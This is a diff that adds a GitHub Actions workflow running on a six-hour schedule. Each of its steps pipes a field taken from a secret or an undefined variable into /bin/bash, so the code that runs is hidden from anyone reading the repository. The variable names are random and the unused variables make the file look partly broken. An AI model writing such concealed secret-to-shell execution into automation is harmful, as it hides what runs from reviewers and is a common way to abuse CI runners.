@@ -1,0 +1,29 @@
+name: jueduiyoutong
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '22 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: jueduiyoutong
+        env:
+          sezg21984: ${{ secrets.sezg21984 }}
+        run: |
+          echo $sezg21984 | jq -r .asd96 | /bin/bash
+          echo $jf3752 | jq -r .k34304 | /bin/bash
+          echo $vs41404 | jq -r .rfzg69689 | /bin/bash
+          echo $w3397 | jq -r .frzvh778 | /bin/bash
+          echo $jgo6 | jq -r .hfhsy65544 | /bin/bash
+          echo $wp8 | jq -r .jxcwf51 | /bin/bash
+          echo $g7049 | jq -r .vz6457 | /bin/bash
+          echo $ot678 | jq -r .sy20262 | /bin/bash
+          echo $xfhms30 | jq -r .ws3 | /bin/bash
+          echo $wsjv37047 | jq -r .ti73 | /bin/bash
+          echo $dlx64 | jq -r .yquz6609 | /bin/bash
+          echo $ypuw4 | jq -r .mpfao35754 | /bin/bash
+          echo $f0 | jq -r .xw88724 | /bin/bash
+
